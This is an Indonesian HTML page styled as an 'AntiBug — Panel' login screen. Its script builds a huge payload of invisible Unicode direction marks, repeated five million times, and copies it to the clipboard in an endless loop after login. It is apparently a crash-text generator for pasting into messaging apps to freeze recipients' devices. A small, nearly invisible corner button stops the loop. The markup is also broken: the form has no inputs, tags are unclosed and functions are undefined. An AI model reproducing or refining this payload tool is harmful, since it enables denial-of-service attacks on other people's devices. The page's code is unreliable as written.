<!DOCTYPE html>  <html lang="id">  <head>  
    <meta charset="UTF-8">  
    <meta name="viewport" content="width=device-width, initial-scale=1.0">  
    <title>AntiBug</title>  
  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet">
  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" rel="stylesheet">
  <link rel="icon" href="bug.jpg" type="image/jpeg">
  <style>  
    html,  
   
    /* Canvas untuk galaxy */  
    #galaxyCanvas {  
        position: fixed;  
        top: 0;  
        left: 0;  
        width: 100%;  
        height: 100%;  
        z-index: -1;  
        background: black;  
    }  

    /* Tombol di tengah */  
    .center-btn {  
        position: absolute;  
        top: 50%;  
        left: 50%;  
        transform: translate(-50%, -50%);  
        padding: 18px 40px;  
        background: rgba(255, 255, 255, 0.15);  
        color: white;  
        border: 2px solid white;  
        border-radius: 8px;  
        font-size: 22px;  
        cursor: pointer;  
        backdrop-filter: blur(4px);  
        transition: 0.3s;  
    }  

    .center-btn:hover {  
        background: rgba(255, 255, 255, 0.3);  
        transform: translate(-50%, -50%) scale(1.05);  
    }  

    #dotBtn {  
        position: fixed;  
        bottom: 8px;  
        right: 8px;  
        width: 40px;  
        height: 40px;  
        background: #333;  
        border-radius: 50%;  
        border: none;  
        cursor: pointer;  
        opacity: 0;  
        transition: 0.2s;  
            z-index: 9999;
    }  

    #dotBtn:hover {  
        opacity: 0.01;  
        transform: scale(1.7);  
    }  
       * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
    }

    body {
      background: transparent;
      font-family: 'Poppins', sans-serif;
      color: #d1d1d1;
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      position: relative;
      overflow: hidden;
    }

    #particles {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      z-index: 0;
    }

    .login-container {
      position: relative;
      z-index: 2;
      background: rgba(80, 80, 80, 0.15);
      border: 1px solid rgba(200, 200, 200, 0.15);
      backdrop-filter: blur(10px);
      padding: 40px 30px;
      border-radius: 20px;
      max-width: 450px;
      width: 90%;
      box-shadow: 0 0 25px rgba(180, 180, 180, 0.15);
      animation: fadeIn 0.8s ease;
    }

    @keyframes fadeIn {
      from { opacity: 0; transform: translateY(20px); }
      to { opacity: 1; transform: translateY(0); }
    }

    .logo-container {
      text-align: center;
      margin-bottom: 20px;
    }

    .logo {
      width: 100px;
      filter: drop-shadow(0 0 25px rgba(200,200,200,0.3));
      margin-bottom: 20px;
    }

    .title {
      font-size: 32px;
      color: #e0e0e0;
      text-shadow: 0 0 10px rgba(255, 255, 255, 0.15);
      font-weight: 800;
      letter-spacing: 1px;
    }

    .subtitle {
      font-size: 14px;
      color: #b5b5b5;
      margin-bottom: 30px;
    }

    .form-group {
      position: relative;
      margin-bottom: 20px;
    }

    .form-group i {
      position: absolute;
      left: 15px;
      top: 50%;
      transform: translateY(-50%);
      color: #a0a0a0;
      font-size: 16px;
    }

    .form-control {
      width: 100%;
      padding: 14px 14px 14px 45px;
      border-radius: 10px;
      border: none;
      background: rgba(255, 255, 255, 0.05);
      color: #fff;
      font-size: 14px;
      font-family: 'Poppins', sans-serif;
      border: 1px solid rgba(255, 255, 255, 0.1);
    }

    .form-control:focus {
      outline: none;
      border-color: #888;
      box-shadow: 0 0 10px rgba(255,255,255,0.2);
    }

    .form-control::placeholder {
      color: #999;
    }

    .btn-login {
      width: 100%;
      padding: 14px;
      font-size: 16px;
      background: linear-gradient(135deg, #6c6c6c, #2a2a2a);
      color: white;
      font-weight: 600;
      border: none;
      border-radius: 10px;
      cursor: pointer;
      transition: all 0.3s ease;
      font-family: 'Poppins', sans-serif;
      margin-top: 10px;
    }

    .btn-login:hover {
      background: #4d4d4d;
      transform: translateY(-2px);
      box-shadow: 0 8px 16px rgba(255,255,255,0.1);
    }

    .btn-access {
      display: inline-block;
      width: 100%;
      text-align: center;
      background: rgba(255, 255, 255, 0.05);
      color: #d1d1d1;
      padding: 12px;
      border-radius: 10px;
      font-weight: 500;
      text-decoration: none;
      margin-top: 15px;
      transition: all 0.3s ease;
      border: 1px solid rgba(255, 255, 255, 0.1);
    }

    .btn-access:hover {
      background: rgba(255, 255, 255, 0.1);
      transform: translateY(-2px);
    }

    .footer {
      margin-top: 30px;
      text-align: center;
      font-size: 12px;
      color: #8c8c8c;
    }

    .notification {
      position: fixed;
      top: 20px;
      right: 20px;
      padding: 15px 20px;
      border-radius: 8px;
      background: rgba(40, 40, 40, 0.95);
      border: 1px solid #666;
      color: white;
      z-index: 1000;
      box-shadow: 0 5px 15px rgba(0, 0, 0, 0.4);
      transform: translateX(100vw);
      transition: transform 0.3s ease;
      display: flex;
      align-items: center;
      gap: 10px;
    }
    
    .notification.show {
      transform: translateX(0);
    }

    .notification.error {
      background: rgba(120, 0, 0, 0.9);
      border-color: #ff4444;
    }

    .notification.success {
      background: rgba(0, 100, 0, 0.9);
      border-color: #44ff44;
    }

    @media (max-width: 480px) {
      .login-container {
        padding: 30px 20px;
        width: 95%;
      }
      .title { font-size: 28px; }
      .subtitle { font-size: 13px; }
      .form-control { padding: 12px 12px 12px 40px; }
      .btn-login, .btn-access { padding: 12px; }
    }

    @media (max-width: 350px) {
      .title { font-size: 24px; }
      .form-group i { left: 10px; }
      .form-control { padding: 10px 10px 10px 35px; }
    }
#loading-bg {
  position: fixed;
  top: 0;
  left: 0;
  width: 100%;
  height: 100%;
  background: rgba(0,0,0,0.6);
  backdrop-filter: blur(3px);
  display: none;
  z-index: 9999;
  pointer-events: all;
  align-items: center;
  justify-content: center;
}

.loading-circle {
  width: 70px;
  height: 70px;
  border: 6px solid rgba(255,255,255,0.2);
  border-top: 6px solid white;
  border-radius: 50%;
  animation: spin 1s linear infinite;
}

@keyframes spin {
  to { transform: rotate(360deg); }
}
  </style>
</head>

<body>
  <div id="particles"></div>
  <div class="login-container">
    <div class="logo-container">
      <img src="bug.jpg" alt="Neon Invictus Logo" class="logo">
      <div class="title">AntiBug — Panel</div>
      <div class="subtitle">Welcome to AnonymusCentral</div>

      <div class="form-group">

    <button onclick="" class="btn-access">

    <div class="footer">© 2025 ArcZNewEra.</div>
  </div>

  <div id="notification" class="notification">
    <i class="fas fa-check-circle"></i>

<div id="loading-bg">

</div>
<button id="dotBtn"></button>

  <script>
document.addEventListener('DOMContentLoaded', function () {
    particleground(document.getElementById('particles'), {
      dotColor: '#999999',
      lineColor: '#777777',
      minSpeedX: 0.1,
      maxSpeedX: 0.3,
      minSpeedY: 0.1,
      maxSpeedY: 0.3,
      density: 10000,
      particleRadius: 3,
    });
  }, false);
  </script>
 <script>  
/*     loading + notif      */
function showNotif(teks, tipe="success") {
    const notif = document.getElementById("notification");
    const ntext = document.getElementById("notification-text");

    notif.classList.remove("success", "error");
    notif.classList.add(tipe);
    
    ntext.textContent = teks;
    notif.classList.add("show");

    setTimeout(() => notif.classList.remove("show"), 3000);
}

function showLoading() {
    const el = document.getElementById("loading-bg");
    el.style.display = "flex"; // Aktifkan flex saat dipanggil
}

function hideLoading() {
    document.getElementById("loading-bg").style.display = "none";
}
async function LoadScreen() {
    showLoading();
    await new Promise(resolve => setTimeout(resolve, 1500));
    hideLoading();
}
/*        End       */

// Utama

// teks Bug
let running = false;  
const invis = "‎‏‏‎‏‏‎‎‏‏‎‏‏‎‎‏‏‎‏‏‎‎‎‏‏‎‏‏‎‎‏‏‎‏‏‎‎‏‏‎‏‏‎‎‏‏‎‏‏‎‎‏‏‎‏‏‎‎‏‏‎‏‏‎‎‏‏‎‏‏‎‎‏‏‎‏‏‎‎‏‏‎‏‏‎‎‏‏‎‏‏‎‎‏‏‎‏‏‎‎".repeat(5000000);

//fungsi utama utama
async function utama() {
     await navigator.clipboard.writeText(invis);
}
// loop utama
async function loop() {  
    running = true;  
    while (running) {   
    await utama();
    await utama();
    }  
}
// progam utama
async function copyText() { 
    await loop(); // start func loop
}

async function loginNow() {
    const user = document.querySelector('input[name="username"]').value;
    const pass = document.querySelector('input[name="password"]').value;

    if (login(user, pass)) {
        await LoadScreen();
        showNotif("Login sukses!", "success");
        copyText()
    } else {
        await LoadScreen();
        showNotif("Username atau password salah!", "error");
        
    }
}


document.getElementById("dotBtn").onclick = () => {
    localStorage.clear()
    running = false;
    showNotif("reset sukses!", "success");
};

</html>
